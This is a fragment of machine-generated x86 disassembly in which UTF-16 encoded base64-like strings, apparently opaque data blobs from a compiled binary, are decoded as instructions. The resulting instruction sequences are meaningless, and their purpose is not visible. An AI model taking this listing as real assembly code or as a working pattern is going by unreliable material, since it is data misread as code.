  40b3c5:	00 58 00             	add    %bl,0x0(%eax)
  40b3c8:	46                   	inc    %esi
  40b3c9:	00 72 00             	add    %dh,0x0(%edx)
  40b3cc:	37                   	aaa
  40b3cd:	00 2b                	add    %ch,(%ebx)
  40b3cf:	00 58 00             	add    %bl,0x0(%eax)
  40b3d2:	54                   	push   %esp
  40b3d3:	00 68 00             	add    %ch,0x0(%eax)
  40b3d6:	49                   	dec    %ecx
  40b3d7:	00 6e 00             	add    %ch,0x0(%esi)
  40b3da:	46                   	inc    %esi
  40b3db:	00 69 00             	add    %ch,0x0(%ecx)
  40b3de:	4c                   	dec    %esp
  40b3df:	00 63 00             	add    %ah,0x0(%ebx)
  40b3e2:	35 00 76 00 4c       	xor    $0x4c007600,%eax
  40b3e7:	00 4d 00             	add    %cl,0x0(%ebp)
  40b3ea:	32 00                	xor    (%eax),%al
  40b3ec:	62 00                	bound  %eax,(%eax)
  40b3ee:	6d                   	insl   (%dx),%es:(%edi)
  40b3ef:	00 57 00             	add    %dl,0x0(%edi)
  40b3f2:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40b3f6:	69 00 39 00 7a 00    	imul   $0x7a0039,(%eax),%eax
  40b3fc:	76 00                	jbe    0x40b3fe
  40b3fe:	48                   	dec    %eax
  40b3ff:	00 66 00             	add    %ah,0x0(%esi)
  40b402:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40b406:	4f                   	dec    %edi
  40b407:	00 70 00             	add    %dh,0x0(%eax)
  40b40a:	4f                   	dec    %edi
  40b40b:	00 67 00             	add    %ah,0x0(%edi)
  40b40e:	4a                   	dec    %edx
  40b40f:	00 72 00             	add    %dh,0x0(%edx)
  40b412:	68 00 33 00 46       	push   $0x46003300
  40b417:	00 55 00             	add    %dl,0x0(%ebp)
  40b41a:	79 00                	jns    0x40b41c
  40b41c:	38 00                	cmp    %al,(%eax)
  40b41e:	57                   	push   %edi
  40b41f:	00 58 00             	add    %bl,0x0(%eax)
  40b422:	41                   	inc    %ecx
  40b423:	00 55 00             	add    %dl,0x0(%ebp)
  40b426:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b429:	00 59 00             	add    %bl,0x0(%ecx)
  40b42c:	4a                   	dec    %edx
  40b42d:	00 41 00             	add    %al,0x0(%ecx)
  40b430:	62 00                	bound  %eax,(%eax)
  40b432:	45                   	inc    %ebp
  40b433:	00 4f 00             	add    %cl,0x0(%edi)
  40b436:	77 00                	ja     0x40b438
  40b438:	32 00                	xor    (%eax),%al
  40b43a:	39 00                	cmp    %eax,(%eax)
  40b43c:	52                   	push   %edx
  40b43d:	00 4d 00             	add    %cl,0x0(%ebp)
  40b440:	4a                   	dec    %edx
  40b441:	00 43 00             	add    %al,0x0(%ebx)
  40b444:	35 00 56 00 56       	xor    $0x56005600,%eax
  40b449:	00 4e 00             	add    %cl,0x0(%esi)
  40b44c:	69 00 70 00 59 00    	imul   $0x590070,(%eax),%eax
  40b452:	61                   	popa
  40b453:	00 71 00             	add    %dh,0x0(%ecx)
  40b456:	67 00 64 00          	add    %ah,0x0(%si)
  40b45a:	62 00                	bound  %eax,(%eax)
  40b45c:	5a                   	pop    %edx
  40b45d:	00 38                	add    %bh,(%eax)
  40b45f:	00 66 00             	add    %ah,0x0(%esi)
  40b462:	6f                   	outsl  %ds:(%esi),(%dx)
  40b463:	00 7a 00             	add    %bh,0x0(%edx)
  40b466:	4c                   	dec    %esp
  40b467:	00 70 00             	add    %dh,0x0(%eax)
  40b46a:	6d                   	insl   (%dx),%es:(%edi)
  40b46b:	00 6e 00             	add    %ch,0x0(%esi)
  40b46e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b46f:	00 5a 00             	add    %bl,0x0(%edx)
  40b472:	7a 00                	jp     0x40b474
  40b474:	34 00                	xor    $0x0,%al
  40b476:	68 00 30 00 35       	push   $0x35003000
  40b47b:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40b47f:	00 6a 00             	add    %ch,0x0(%edx)
  40b482:	69 00 79 00 6f 00    	imul   $0x6f0079,(%eax),%eax
  40b488:	70 00                	jo     0x40b48a
  40b48a:	37                   	aaa
  40b48b:	00 79 00             	add    %bh,0x0(%ecx)
  40b48e:	30 00                	xor    %al,(%eax)
  40b490:	4a                   	dec    %edx
  40b491:	00 33                	add    %dh,(%ebx)
  40b493:	00 58 00             	add    %bl,0x0(%eax)
  40b496:	63 00                	arpl   %eax,(%eax)
  40b498:	74 00                	je     0x40b49a
  40b49a:	31 00                	xor    %eax,(%eax)
  40b49c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b49d:	00 75 00             	add    %dh,0x0(%ebp)
  40b4a0:	6d                   	insl   (%dx),%es:(%edi)
  40b4a1:	00 67 00             	add    %ah,0x0(%edi)
  40b4a4:	69 00 62 00 47 00    	imul   $0x470062,(%eax),%eax
  40b4aa:	4d                   	dec    %ebp
  40b4ab:	00 61 00             	add    %ah,0x0(%ecx)
  40b4ae:	6a 00                	push   $0x0
  40b4b0:	77 00                	ja     0x40b4b2
  40b4b2:	51                   	push   %ecx
  40b4b3:	00 4f 00             	add    %cl,0x0(%edi)
  40b4b6:	46                   	inc    %esi
  40b4b7:	00 62 00             	add    %ah,0x0(%edx)
  40b4ba:	38 00                	cmp    %al,(%eax)
  40b4bc:	42                   	inc    %edx
  40b4bd:	00 75 00             	add    %dh,0x0(%ebp)
  40b4c0:	50                   	push   %eax
  40b4c1:	00 67 00             	add    %ah,0x0(%edi)
  40b4c4:	4b                   	dec    %ebx
  40b4c5:	00 2b                	add    %ch,(%ebx)
  40b4c7:	00 69 00             	add    %ch,0x0(%ecx)
  40b4ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4cb:	00 68 00             	add    %ch,0x0(%eax)
  40b4ce:	4f                   	dec    %edi
  40b4cf:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4d2:	45                   	inc    %ebp
  40b4d3:	00 6e 00             	add    %ch,0x0(%esi)
  40b4d6:	34 00                	xor    $0x0,%al
  40b4d8:	52                   	push   %edx
  40b4d9:	00 31                	add    %dh,(%ecx)
  40b4db:	00 71 00             	add    %dh,0x0(%ecx)
  40b4de:	35 00 56 00 46       	xor    $0x46005600,%eax
  40b4e3:	00 66 00             	add    %ah,0x0(%esi)
  40b4e6:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40b4e9:	00 35 00 4c 00 67    	add    %dh,0x67004c00
  40b4ef:	00 31                	add    %dh,(%ecx)
  40b4f1:	00 72 00             	add    %dh,0x0(%edx)
  40b4f4:	50                   	push   %eax
  40b4f5:	00 38                	add    %bh,(%eax)
  40b4f7:	00 58 00             	add    %bl,0x0(%eax)
  40b4fa:	35 00 68 00 50       	xor    $0x50006800,%eax
  40b4ff:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40b503:	00 4f 00             	add    %cl,0x0(%edi)
  40b506:	54                   	push   %esp
  40b507:	00 55 00             	add    %dl,0x0(%ebp)
  40b50a:	79 00                	jns    0x40b50c
  40b50c:	4d                   	dec    %ebp
  40b50d:	00 31                	add    %dh,(%ecx)
  40b50f:	00 41 00             	add    %al,0x0(%ecx)
  40b512:	42                   	inc    %edx
  40b513:	00 37                	add    %dh,(%edi)
  40b515:	00 32                	add    %dh,(%edx)
  40b517:	00 65 00             	add    %ah,0x0(%ebp)
  40b51a:	61                   	popa
  40b51b:	00 52 00             	add    %dl,0x0(%edx)
  40b51e:	73 00                	jae    0x40b520
  40b520:	51                   	push   %ecx
  40b521:	00 69 00             	add    %ch,0x0(%ecx)
  40b524:	72 00                	jb     0x40b526
  40b526:	34 00                	xor    $0x0,%al
  40b528:	71 00                	jno    0x40b52a
  40b52a:	74 00                	je     0x40b52c
  40b52c:	76 00                	jbe    0x40b52e
  40b52e:	77 00                	ja     0x40b530
  40b530:	6c                   	insb   (%dx),%es:(%edi)
  40b531:	00 71 00             	add    %dh,0x0(%ecx)
  40b534:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  40b538:	48                   	dec    %eax
  40b539:	00 77 00             	add    %dh,0x0(%edi)
  40b53c:	51                   	push   %ecx
  40b53d:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40b541:	00 6b 00             	add    %ch,0x0(%ebx)
  40b544:	57                   	push   %edi
  40b545:	00 79 00             	add    %bh,0x0(%ecx)
  40b548:	52                   	push   %edx
  40b549:	00 76 00             	add    %dh,0x0(%esi)
  40b54c:	6c                   	insb   (%dx),%es:(%edi)
  40b54d:	00 2f                	add    %ch,(%edi)
  40b54f:	00 70 00             	add    %dh,0x0(%eax)
  40b552:	75 00                	jne    0x40b554
  40b554:	76 00                	jbe    0x40b556
  40b556:	72 00                	jb     0x40b558
  40b558:	73 00                	jae    0x40b55a
  40b55a:	62 00                	bound  %eax,(%eax)
  40b55c:	6c                   	insb   (%dx),%es:(%edi)
  40b55d:	00 79 00             	add    %bh,0x0(%ecx)
  40b560:	43                   	inc    %ebx
  40b561:	00 72 00             	add    %dh,0x0(%edx)
  40b564:	47                   	inc    %edi
  40b565:	00 5a 00             	add    %bl,0x0(%edx)
  40b568:	45                   	inc    %ebp
  40b569:	00 76 00             	add    %dh,0x0(%esi)
  40b56c:	79 00                	jns    0x40b56e
  40b56e:	78 00                	js     0x40b570
  40b570:	6f                   	outsl  %ds:(%esi),(%dx)
  40b571:	00 35 00 47 00 6e    	add    %dh,0x6e004700
  40b577:	00 2b                	add    %ch,(%ebx)
  40b579:	00 36                	add    %dh,(%esi)
  40b57b:	00 49 00             	add    %cl,0x0(%ecx)
  40b57e:	54                   	push   %esp
  40b57f:	00 47 00             	add    %al,0x0(%edi)
  40b582:	39 00                	cmp    %eax,(%eax)
  40b584:	2b 00                	sub    (%eax),%eax
  40b586:	58                   	pop    %eax
  40b587:	00 69 00             	add    %ch,0x0(%ecx)
  40b58a:	4a                   	dec    %edx
  40b58b:	00 7a 00             	add    %bh,0x0(%edx)
  40b58e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b58f:	00 46 00             	add    %al,0x0(%esi)
  40b592:	6c                   	insb   (%dx),%es:(%edi)
  40b593:	00 71 00             	add    %dh,0x0(%ecx)
  40b596:	79 00                	jns    0x40b598
  40b598:	62 00                	bound  %eax,(%eax)
  40b59a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b59b:	00 67 00             	add    %ah,0x0(%edi)
  40b59e:	2f                   	das
  40b59f:	00 67 00             	add    %ah,0x0(%edi)
  40b5a2:	62 00                	bound  %eax,(%eax)
  40b5a4:	67 00 44 00          	add    %al,0x0(%si)
  40b5a8:	72 00                	jb     0x40b5aa
  40b5aa:	74 00                	je     0x40b5ac
  40b5ac:	6b 00 70             	imul   $0x70,(%eax),%eax
  40b5af:	00 66 00             	add    %ah,0x0(%esi)
  40b5b2:	2b 00                	sub    (%eax),%eax
  40b5b4:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40b5b8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5b9:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40b5bd:	00 38                	add    %bh,(%eax)
  40b5bf:	00 75 00             	add    %dh,0x0(%ebp)
  40b5c2:	66 00 73 00          	data16 add %dh,0x0(%ebx)
  40b5c6:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40b5ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5cb:	00 6a 00             	add    %ch,0x0(%edx)
  40b5ce:	70 00                	jo     0x40b5d0
  40b5d0:	31 00                	xor    %eax,(%eax)
  40b5d2:	4e                   	dec    %esi
  40b5d3:	00 46 00             	add    %al,0x0(%esi)
  40b5d6:	4f                   	dec    %edi
  40b5d7:	00 58 00             	add    %bl,0x0(%eax)
  40b5da:	69 00 30 00 41 00    	imul   $0x410030,(%eax),%eax
  40b5e0:	32 00                	xor    (%eax),%al
  40b5e2:	79 00                	jns    0x40b5e4
  40b5e4:	4e                   	dec    %esi
  40b5e5:	00 62 00             	add    %ah,0x0(%edx)
  40b5e8:	34 00                	xor    $0x0,%al
  40b5ea:	30 00                	xor    %al,(%eax)
  40b5ec:	46                   	inc    %esi
  40b5ed:	00 78 00             	add    %bh,0x0(%eax)
  40b5f0:	6d                   	insl   (%dx),%es:(%edi)
  40b5f1:	00 66 00             	add    %ah,0x0(%esi)
  40b5f4:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b5f7:	00 39                	add    %bh,(%ecx)
  40b5f9:	00 76 00             	add    %dh,0x0(%esi)
  40b5fc:	50                   	push   %eax
  40b5fd:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40b601:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40b605:	00 55 00             	add    %dl,0x0(%ebp)
  40b608:	38 00                	cmp    %al,(%eax)
  40b60a:	6d                   	insl   (%dx),%es:(%edi)
  40b60b:	00 6e 00             	add    %ch,0x0(%esi)
  40b60e:	45                   	inc    %ebp
  40b60f:	00 38                	add    %bh,(%eax)
  40b611:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40b615:	00 49 00             	add    %cl,0x0(%ecx)
  40b618:	52                   	push   %edx
  40b619:	00 45 00             	add    %al,0x0(%ebp)
  40b61c:	39 00                	cmp    %eax,(%eax)
  40b61e:	55                   	push   %ebp
  40b61f:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40b623:	00 77 00             	add    %dh,0x0(%edi)
  40b626:	6d                   	insl   (%dx),%es:(%edi)
  40b627:	00 33                	add    %dh,(%ebx)
  40b629:	00 2f                	add    %ch,(%edi)
  40b62b:	00 63 00             	add    %ah,0x0(%ebx)
  40b62e:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40b632:	69 00 48 00 49 00    	imul   $0x490048,(%eax),%eax
  40b638:	58                   	pop    %eax
  40b639:	00 37                	add    %dh,(%edi)
  40b63b:	00 36                	add    %dh,(%esi)
  40b63d:	00 77 00             	add    %dh,0x0(%edi)
  40b640:	2f                   	das
  40b641:	00 2f                	add    %ch,(%edi)
  40b643:	00 58 00             	add    %bl,0x0(%eax)
  40b646:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40b64a:	77 00                	ja     0x40b64c
  40b64c:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40b651:	32 00                	xor    (%eax),%al
  40b653:	7a 00                	jp     0x40b655
  40b655:	37                   	aaa
  40b656:	00 76 00             	add    %dh,0x0(%esi)
  40b659:	54                   	push   %esp
  40b65a:	00 6e 00             	add    %ch,0x0(%esi)
  40b65d:	4d                   	dec    %ebp
  40b65e:	00 67 00             	add    %ah,0x0(%edi)
  40b661:	39 00                	cmp    %eax,(%eax)
  40b663:	52                   	push   %edx
  40b664:	00 53 00             	add    %dl,0x0(%ebx)
  40b667:	32 00                	xor    (%eax),%al
  40b669:	6d                   	insl   (%dx),%es:(%edi)
  40b66a:	00 57 00             	add    %dl,0x0(%edi)
  40b66d:	59                   	pop    %ecx
  40b66e:	00 67 00             	add    %ah,0x0(%edi)
  40b671:	49                   	dec    %ecx
  40b672:	00 47 00             	add    %al,0x0(%edi)
  40b675:	56                   	push   %esi
  40b676:	00 62 00             	add    %ah,0x0(%edx)
  40b679:	49                   	dec    %ecx
  40b67a:	00 71 00             	add    %dh,0x0(%ecx)
  40b67d:	2b 00                	sub    (%eax),%eax
  40b67f:	74 00                	je     0x40b681
  40b681:	74 00                	je     0x40b683
  40b683:	79 00                	jns    0x40b685
  40b685:	55                   	push   %ebp
  40b686:	00 47 00             	add    %al,0x0(%edi)
  40b689:	46                   	inc    %esi
  40b68a:	00 51 00             	add    %dl,0x0(%ecx)
  40b68d:	5a                   	pop    %edx
  40b68e:	00 67 00             	add    %ah,0x0(%edi)
  40b691:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40b695:	76 00                	jbe    0x40b697
  40b697:	67 00 44 00          	add    %al,0x0(%si)
  40b69b:	4c                   	dec    %esp
  40b69c:	00 35 00 2b 00 52    	add    %dh,0x52002b00
  40b6a2:	00 33                	add    %dh,(%ebx)
  40b6a4:	00 5a 00             	add    %bl,0x0(%edx)
  40b6a7:	56                   	push   %esi
  40b6a8:	00 65 00             	add    %ah,0x0(%ebp)
  40b6ab:	7a 00                	jp     0x40b6ad
  40b6ad:	4f                   	dec    %edi
  40b6ae:	00 30                	add    %dh,(%eax)
  40b6b0:	00 33                	add    %dh,(%ebx)
  40b6b2:	00 77 00             	add    %dh,0x0(%edi)
  40b6b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6b6:	00 31                	add    %dh,(%ecx)
  40b6b8:	00 61 00             	add    %ah,0x0(%ecx)
  40b6bb:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40b6bf:	4d                   	dec    %ebp
  40b6c0:	00 37                	add    %dh,(%edi)
  40b6c2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b6c5:	55                   	push   %ebp
  40b6c6:	00 48 00             	add    %cl,0x0(%eax)
  40b6c9:	33 00                	xor    (%eax),%eax
  40b6cb:	31 00                	xor    %eax,(%eax)
  40b6cd:	78 00                	js     0x40b6cf
  40b6cf:	63 00                	arpl   %eax,(%eax)
  40b6d1:	50                   	push   %eax
  40b6d2:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40b6d6:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40b6da:	00 65 00             	add    %ah,0x0(%ebp)
  40b6dd:	75 00                	jne    0x40b6df
  40b6df:	6c                   	insb   (%dx),%es:(%edi)
  40b6e0:	00 5a 00             	add    %bl,0x0(%edx)
  40b6e3:	70 00                	jo     0x40b6e5
  40b6e5:	4c                   	dec    %esp
  40b6e6:	00 32                	add    %dh,(%edx)
  40b6e8:	00 79 00             	add    %bh,0x0(%ecx)
  40b6eb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6ec:	00 4f 00             	add    %cl,0x0(%edi)
  40b6ef:	68 00 4c 00 50       	push   $0x50004c00
  40b6f4:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6f7:	4f                   	dec    %edi
  40b6f8:	00 58 00             	add    %bl,0x0(%eax)
  40b6fb:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40b6ff:	32 00                	xor    (%eax),%al
  40b701:	77 00                	ja     0x40b703
  40b703:	4f                   	dec    %edi
  40b704:	00 6f 00             	add    %ch,0x0(%edi)
  40b707:	49                   	dec    %ecx
  40b708:	00 7a 00             	add    %bh,0x0(%edx)
  40b70b:	45                   	inc    %ebp
  40b70c:	00 75 00             	add    %dh,0x0(%ebp)
  40b70f:	4c                   	dec    %esp
  40b710:	00 71 00             	add    %dh,0x0(%ecx)
  40b713:	6c                   	insb   (%dx),%es:(%edi)
  40b714:	00 75 00             	add    %dh,0x0(%ebp)
  40b717:	35 00 75 00 52       	xor    $0x52007500,%eax
  40b71c:	00 52 00             	add    %dl,0x0(%edx)
  40b71f:	35 00 4a 00 41       	xor    $0x41004a00,%eax
  40b724:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b727:	30 00                	xor    %al,(%eax)
  40b729:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40b72d:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40b731:	38 00                	cmp    %al,(%eax)
  40b733:	39 00                	cmp    %eax,(%eax)
  40b735:	63 00                	arpl   %eax,(%eax)
  40b737:	73 00                	jae    0x40b739
  40b739:	38 00                	cmp    %al,(%eax)
  40b73b:	73 00                	jae    0x40b73d
  40b73d:	48                   	dec    %eax
  40b73e:	00 61 00             	add    %ah,0x0(%ecx)
  40b741:	74 00                	je     0x40b743
  40b743:	36 00 74 00 34       	add    %dh,%ss:0x34(%eax,%eax,1)
  40b748:	00 59 00             	add    %bl,0x0(%ecx)
  40b74b:	69 00 58 00 75 00    	imul   $0x750058,(%eax),%eax
  40b751:	58                   	pop    %eax
  40b752:	00 41 00             	add    %al,0x0(%ecx)
  40b755:	44                   	inc    %esp
  40b756:	00 4d 00             	add    %cl,0x0(%ebp)
  40b759:	4b                   	dec    %ebx
  40b75a:	00 70 00             	add    %dh,0x0(%eax)
  40b75d:	78 00                	js     0x40b75f
  40b75f:	55                   	push   %ebp
  40b760:	00 65 00             	add    %ah,0x0(%ebp)
  40b763:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40b767:	46                   	inc    %esi
  40b768:	00 36                	add    %dh,(%esi)
  40b76a:	00 66 00             	add    %ah,0x0(%esi)
  40b76d:	62 00                	bound  %eax,(%eax)
  40b76f:	2b 00                	sub    (%eax),%eax
  40b771:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40b775:	49                   	dec    %ecx
  40b776:	00 31                	add    %dh,(%ecx)
  40b778:	00 68 00             	add    %ch,0x0(%eax)
  40b77b:	44                   	inc    %esp
  40b77c:	00 47 00             	add    %al,0x0(%edi)
  40b77f:	46                   	inc    %esi
  40b780:	00 57 00             	add    %dl,0x0(%edi)
  40b783:	37                   	aaa
  40b784:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40b788:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40b78c:	00 48 00             	add    %cl,0x0(%eax)
  40b78f:	57                   	push   %edi
  40b790:	00 67 00             	add    %ah,0x0(%edi)
  40b793:	44                   	inc    %esp
  40b794:	00 32                	add    %dh,(%edx)
  40b796:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40b79a:	00 62 00             	add    %ah,0x0(%edx)
  40b79d:	58                   	pop    %eax
  40b79e:	00 61 00             	add    %ah,0x0(%ecx)
  40b7a1:	61                   	popa
  40b7a2:	00 6f 00             	add    %ch,0x0(%edi)
  40b7a5:	67 00 30             	add    %dh,(%bx,%si)
  40b7a8:	00 53 00             	add    %dl,0x0(%ebx)
  40b7ab:	68 00 62 00 33       	push   $0x33006200
  40b7b0:	00 35 00 4e 00 54    	add    %dh,0x54004e00
  40b7b6:	00 2f                	add    %ch,(%edi)
  40b7b8:	00 58 00             	add    %bl,0x0(%eax)
  40b7bb:	47                   	inc    %edi
  40b7bc:	00 5a 00             	add    %bl,0x0(%edx)
  40b7bf:	44                   	inc    %esp
  40b7c0:	00 51 00             	add    %dl,0x0(%ecx)
  40b7c3:	51                   	push   %ecx
  40b7c4:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40b7c8:	00 69 00             	add    %ch,0x0(%ecx)
  40b7cb:	35 00 34 00 74       	xor    $0x74003400,%eax
  40b7d0:	00 33                	add    %dh,(%ebx)
  40b7d2:	00 4f 00             	add    %cl,0x0(%edi)
  40b7d5:	75 00                	jne    0x40b7d7
  40b7d7:	79 00                	jns    0x40b7d9
  40b7d9:	73 00                	jae    0x40b7db
  40b7db:	7a 00                	jp     0x40b7dd
  40b7dd:	35 00 68 00 55       	xor    $0x55006800,%eax
  40b7e2:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  40b7e6:	00 4f 00             	add    %cl,0x0(%edi)
  40b7e9:	4e                   	dec    %esi
  40b7ea:	00 42 00             	add    %al,0x0(%edx)
  40b7ed:	61                   	popa
  40b7ee:	00 53 00             	add    %dl,0x0(%ebx)
  40b7f1:	49                   	dec    %ecx
  40b7f2:	00 7a 00             	add    %bh,0x0(%edx)
  40b7f5:	44                   	inc    %esp
  40b7f6:	00 6b 00             	add    %ch,0x0(%ebx)
  40b7f9:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40b7fd:	34 00                	xor    $0x0,%al
  40b7ff:	68 00 74 00 4a       	push   $0x4a007400
  40b804:	00 31                	add    %dh,(%ecx)
  40b806:	00 59 00             	add    %bl,0x0(%ecx)
  40b809:	71 00                	jno    0x40b80b
  40b80b:	41                   	inc    %ecx
  40b80c:	00 59 00             	add    %bl,0x0(%ecx)
  40b80f:	77 00                	ja     0x40b811
  40b811:	63 00                	arpl   %eax,(%eax)
  40b813:	6c                   	insb   (%dx),%es:(%edi)
  40b814:	00 41 00             	add    %al,0x0(%ecx)
  40b817:	4a                   	dec    %edx
  40b818:	00 59 00             	add    %bl,0x0(%ecx)
  40b81b:	78 00                	js     0x40b81d
  40b81d:	53                   	push   %ebx
  40b81e:	00 30                	add    %dh,(%eax)
  40b820:	00 47 00             	add    %al,0x0(%edi)
  40b823:	78 00                	js     0x40b825
  40b825:	74 00                	je     0x40b827
  40b827:	46                   	inc    %esi
  40b828:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40b82c:	00 51 00             	add    %dl,0x0(%ecx)
  40b82f:	67 00 57 00          	add    %dl,0x0(%bx)
  40b833:	67 00 36 00 44       	add    %dh,0x4400
  40b838:	00 75 00             	add    %dh,0x0(%ebp)
  40b83b:	64 00 32             	add    %dh,%fs:(%edx)
  40b83e:	00 37                	add    %dh,(%edi)
  40b840:	00 53 00             	add    %dl,0x0(%ebx)
  40b843:	79 00                	jns    0x40b845
  40b845:	73 00                	jae    0x40b847
  40b847:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40b84b:	4a                   	dec    %edx
  40b84c:	00 5a 00             	add    %bl,0x0(%edx)
  40b84f:	76 00                	jbe    0x40b851
  40b851:	68 00 73 00 73       	push   $0x73007300
  40b856:	00 58 00             	add    %bl,0x0(%eax)
  40b859:	54                   	push   %esp
  40b85a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b85d:	51                   	push   %ecx
  40b85e:	00 38                	add    %bh,(%eax)
  40b860:	00 35 00 57 00 6a    	add    %dh,0x6a005700
  40b866:	00 72 00             	add    %dh,0x0(%edx)
  40b869:	37                   	aaa
  40b86a:	00 46 00             	add    %al,0x0(%esi)
  40b86d:	76 00                	jbe    0x40b86f
  40b86f:	6a 00                	push   $0x0
  40b871:	61                   	popa
  40b872:	00 66 00             	add    %ah,0x0(%esi)
  40b875:	32 00                	xor    (%eax),%al
  40b877:	61                   	popa
  40b878:	00 57 00             	add    %dl,0x0(%edi)
  40b87b:	37                   	aaa
  40b87c:	00 30                	add    %dh,(%eax)
  40b87e:	00 48 00             	add    %cl,0x0(%eax)
  40b881:	73 00                	jae    0x40b883
  40b883:	79 00                	jns    0x40b885
  40b885:	54                   	push   %esp
  40b886:	00 73 00             	add    %dh,0x0(%ebx)
  40b889:	6d                   	insl   (%dx),%es:(%edi)
  40b88a:	00 47 00             	add    %al,0x0(%edi)
  40b88d:	7a 00                	jp     0x40b88f
  40b88f:	52                   	push   %edx
  40b890:	00 38                	add    %bh,(%eax)
  40b892:	00 52 00             	add    %dl,0x0(%edx)
  40b895:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40b899:	53                   	push   %ebx
  40b89a:	00 61 00             	add    %ah,0x0(%ecx)
  40b89d:	38 00                	cmp    %al,(%eax)
  40b89f:	31 00                	xor    %eax,(%eax)
  40b8a1:	43                   	inc    %ebx
  40b8a2:	00 50 00             	add    %dl,0x0(%eax)
  40b8a5:	49                   	dec    %ecx
  40b8a6:	00 62 00             	add    %ah,0x0(%edx)
  40b8a9:	32 00                	xor    (%eax),%al
  40b8ab:	39 00                	cmp    %eax,(%eax)
  40b8ad:	52                   	push   %edx
  40b8ae:	00 42 00             	add    %al,0x0(%edx)
  40b8b1:	73 00                	jae    0x40b8b3
  40b8b3:	69 00 59 00 55 00    	imul   $0x550059,(%eax),%eax
  40b8b9:	78 00                	js     0x40b8bb
  40b8bb:	46                   	inc    %esi
  40b8bc:	00 79 00             	add    %bh,0x0(%ecx)
  40b8bf:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40b8c3:	31 00                	xor    %eax,(%eax)
  40b8c5:	76 00                	jbe    0x40b8c7
  40b8c7:	51                   	push   %ecx
  40b8c8:	00 6f 00             	add    %ch,0x0(%edi)
  40b8cb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8cc:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8cf:	4b                   	dec    %ebx
  40b8d0:	00 63 00             	add    %ah,0x0(%ebx)
  40b8d3:	56                   	push   %esi
  40b8d4:	00 56 00             	add    %dl,0x0(%esi)
  40b8d7:	61                   	popa
  40b8d8:	00 49 00             	add    %cl,0x0(%ecx)
  40b8db:	46                   	inc    %esi
  40b8dc:	00 41 00             	add    %al,0x0(%ecx)
  40b8df:	41                   	inc    %ecx
  40b8e0:	00 76 00             	add    %dh,0x0(%esi)
  40b8e3:	69 00 58 00 72 00    	imul   $0x720058,(%eax),%eax
  40b8e9:	30 00                	xor    %al,(%eax)
  40b8eb:	78 00                	js     0x40b8ed
  40b8ed:	4e                   	dec    %esi
  40b8ee:	00 72 00             	add    %dh,0x0(%edx)
  40b8f1:	75 00                	jne    0x40b8f3
  40b8f3:	73 00                	jae    0x40b8f5
  40b8f5:	62 00                	bound  %eax,(%eax)
  40b8f7:	33 00                	xor    (%eax),%eax
  40b8f9:	79 00                	jns    0x40b8fb
  40b8fb:	59                   	pop    %ecx
  40b8fc:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40b900:	00 42 00             	add    %al,0x0(%edx)
  40b903:	59                   	pop    %ecx
  40b904:	00 69 00             	add    %ch,0x0(%ecx)
  40b907:	61                   	popa
  40b908:	00 42 00             	add    %al,0x0(%edx)
  40b90b:	71 00                	jno    0x40b90d
  40b90d:	4f                   	dec    %edi
  40b90e:	00 56 00             	add    %dl,0x0(%esi)
  40b911:	45                   	inc    %ebp
  40b912:	00 4a 00             	add    %cl,0x0(%edx)
  40b915:	2f                   	das
  40b916:	00 31                	add    %dh,(%ecx)
  40b918:	00 55 00             	add    %dl,0x0(%ebp)
  40b91b:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40b91f:	74 00                	je     0x40b921
  40b921:	46                   	inc    %esi
  40b922:	00 53 00             	add    %dl,0x0(%ebx)
